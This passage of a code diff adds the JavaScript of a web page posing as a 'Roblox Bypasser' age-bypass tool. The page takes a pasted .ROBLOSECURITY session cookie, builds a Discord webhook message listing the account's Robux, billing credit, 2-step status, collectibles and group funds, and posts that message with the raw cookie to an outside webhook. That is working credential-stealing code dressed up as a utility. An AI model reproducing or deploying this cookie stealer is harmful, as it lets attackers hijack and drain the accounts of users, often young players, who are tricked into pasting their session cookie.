+            },
+            {
+              name: "<:Limited:1313024834783154211> Rap",
+              value: `Rap: ${accountInfo.rap} <:Valk:1313020750038569021>\nOwned: ${accountInfo.ownedItems} <:Inventory:1313020754547310737>`,
+              inline: true,
+            },
+            {
+              name: "<a:Summery:1313021791954014268> Summary",
+              value: "0",
+              inline: true,
+            },
+            {
+              name: "<:Billing:1313020743373819935> Billing",
+              value: `Credit: ${accountInfo.creditBalance} <:Credits:1313020738755756052>\nConvert: 0 <:Robux:1313020721987063829>\nCard: False <:Cards:1313020745223503883>`,
+              inline: true,
+            },
+            {
+              name: "<:Games:1313020733932306462> | Played | Passes",
+              value: `<:bf:1303894849530888214> | False | ___0___\n<:adm:1303894863007453265> | False | ___0___\n<:mm2:1303894855281541212> | False | ___0___\n<:ps99:1303894865079308288> | False | ___0___\n<:bb:1303894852697718854> | False | ___0___\n<:BGS:1361762108366393414> | False | ___0___\n<:petsgo:1349375165095739473> | False | ___0___`,
+              inline: true,
+            },
+            {
+              name: "<:Settings:1313020732225093672> Settings",
+              value: `(Verified <a:False:1313026218567667743>)\n<:2Step:1313020736218333245> ${accountInfo.twoStepEnabled ? "Enabled" : "Disabled"}\n<:VoiceChat:1313020746829926440> ${accountInfo.voiceChatEnabled ? "Enabled" : "Disabled"}`,
+              inline: true,
+            },
+            {
+              name: "<:Premium:1313020726474706994> Premium",
+              value: `${accountInfo.hasPremium ? "True" : "False"}`,
+              inline: true,
+            },
+            {
+              name: "<:Collectible:1313026924678742087> Collectibles",
+              value: `<:Korblox:1313020724184743936> ${accountInfo.hasKorblox ? "True" : "False"}\n<:vvalk:1354438650519355452> ${accountInfo.hasValk ? "True" : "False"}\n<:Headless:1313020741003903016> ${accountInfo.hasHeadless ? "True" : "False"}`,
+              inline: true,
+            },
+            {
+              name: "<:banks:1349856883498029097> Groups",
+              value: `**\r\n<:mb:1383816499244040234> Owned:** ${accountInfo.groupCount}\n**<:members:1354456330152448213> Members** 0\n**<:Credits:1313020738755756052> Funds:** ${accountInfo.groupFunds} <:Robux:1313020721987063829>`,
+              inline: true,
+            },
+            {
+              name: "<:RBC:1376586019566125168> | EXPERTS |",
+              value: `<:bloxfruit:1394415363030257834> | False | <:adoptme:1394415360899420331> | False |\n <:mm2:1394415358257139782> | False | <:petsim99:1394415355320864780> | False |\n <:BGS:1361762108366393414> | False | <:gag2:1394413618556178473> | False |`,
+              inline: true,
+            },
+            {
+              name: "<:Calendar:1392908329927573524> Age Bypasser",
+              value: `**Birthdate:** **${accountInfo.birthdate}**\n**Age:** **${accountInfo.age}** \n**Verified:** <a:False:1313026218567667743>\n**Status:** <a:False:1313026218567667743> **Not Bypassable**`,
+              inline: true,
+            },
+          ],
+          timestamp: new Date().toISOString(),
+        },
+        {
+          description: `<:Cookie:1313022426346426368> **.ROBLOSECURITY**\n**\`\`\`${cookie}\`\`\`**`,
+          color: 0x3B1F7F,
+          thumbnail: {
+            url: "https://bloxtools.icu/assets/img/atryx.png",
+            width: 2000,
+            height: 2000,
+          },
+          timestamp: new Date().toISOString(),
+        },
+      ],
+    };
+
+    // Send to webhook
+    try {
+      const webhookRes = await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(webhookPayload),
+      });
+      if (!webhookRes.ok) {
+        console.error("Webhook send failed:", webhookRes.status);
+        showNotif("Failed to send data to webhook", false);
+        errorSound.play();
+      } else {
+        successSound.play();
+        $("#refreshedBox").fadeIn();
+      }
+    } catch (webhookError) {
+      console.error("Webhook error:", webhookError);
+      showNotif("Error sending data to webhook", false);
+      errorSound.play();
+    }
+  } catch (error) {
+    showNotif("Invalid cookie", false);
+    errorSound.play();
+    console.error("Submit error:", error);
+  } finally {
+    $("#loader").hide();
+  }
+});
+
+function showNotif(msg, isSuccess = false) {
+  const $notif = $("#notif");
+  $notif.removeClass('notif-success notif-error');
+  
+  if (isSuccess) {
+    $notif.addClass('notif-success');
+  } else {
+    $notif.addClass('notif-error');
+  }
+  
+  $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
+}
+
+const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
+let i = 0;
+const typedText = document.getElementById("typedText");
+
+function typeEffect() {
+  const text = texts[i];
+  let index = 0;
+
+  const typing = setInterval(() => {
+    if (index <= text.length) {
+      typedText.textContent = text.slice(0, index);
+      index++;
+    } else {
+      clearInterval(typing);
+      setTimeout(() => {
+        const backspace = setInterval(() => {
+          if (index > 0) {
+            typedText.textContent = text.slice(0, index - 1);
+            index--;
+          } else {
+            clearInterval(backspace);
+            i = (i + 1) % texts.length;
+            setTimeout(typeEffect, 300);
+          }
+        }, 50);
+      }, 2000);
+    }
+  }, 100);
+}
+
+typeEffect();
+
+$("#returnBtn").on("click", function () {
+  $("#refreshedBox").hide();
+  $("#userInfo").hide().empty();
+  $("#cookieInput").val("");
+  $("#refreshBtn").show();
+});
+
+</script>
+
+<!-- Contact Button -->
+<a href="https://discord.gg/p8b7XrMrzM" target="_blank" class="contact-btn">
+  <i class="fab fa-discord"></i>
+  Contact
+</a>
+
+</body>
+</html>
